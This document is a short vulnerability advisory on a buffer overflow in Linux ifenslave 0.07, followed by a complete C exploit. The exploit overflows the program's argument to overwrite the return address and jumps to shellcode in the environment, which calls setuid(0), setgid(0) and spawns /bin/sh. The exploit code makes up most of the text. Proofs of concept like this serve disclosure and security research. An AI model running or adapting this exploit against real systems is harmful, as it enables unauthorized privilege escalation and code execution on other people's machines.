source: http://www.securityfocus.com/bid/7682/info
 
ifenslave for Linux has been reported prone to a buffer overflow vulnerability.
 
The issue is reportedly due to a lack of sufficient bounds checking performed on user-supplied data before it is copied into an internal memory space.
 
It is possible for a local attacker to seize control of the vulnerable application and have malicious arbitrary code executed in the context of ifenslave. ifenslave is not installed setUID or setGID by default.
 
It should be noted that although this vulnerability has been reported to affect ifenslave version 0.07 previous versions might also be affected. 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFSIZE 40

char shellcode[] =
    "\x31\xdb"
    "\x89\xd8"
    "\xb0\x17"
    "\xcd\x80"
    "\x31\xdb"
    "\x89\xd8"
    "\xb0\x17"
    "\xcd\x80"
    "\x31\xdb"
    "\x89\xd8"
    "\xb0\x2e"
    "\xcd\x80"
    "\x31\xc0"
    "\x50"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x31\xd2"
    "\xb0\x0b"
    "\xcd\x80"
     "\x31\xdb"
    "\x89\xd8"
    "\xb0\x01"
    "\xcd\x80";

int main(void)
{
 char buf[BUFSIZE+10];
 char *prog[] = {"/sbin/ifenslave", buf, NULL};
 char *env[] = {"HOME=BLA", shellcode, NULL};

 printf("****************************************\n\n");
 printf("hi,guys\n\n");
 printf("Coded by jsk(&#38463;&#22372;&#65289;from ph4nt0m.net\n");
 printf("Welcome to http://www.ph4nt0m.net\n\n");
 printf("****************************************\n\n\n");

 unsigned long ret = 0xc0000000 - sizeof(void *) - strlen(prog[0]) -
 strlen(shellcode) - 0x02;
 memset(buf,0x41,sizeof(buf));
 memcpy(buf+BUFSIZE+4,(char *)&ret,4);
 buf[BUFSIZE+8] = 0x00;
 execve(prog[0],prog,env);
 return 0;
}

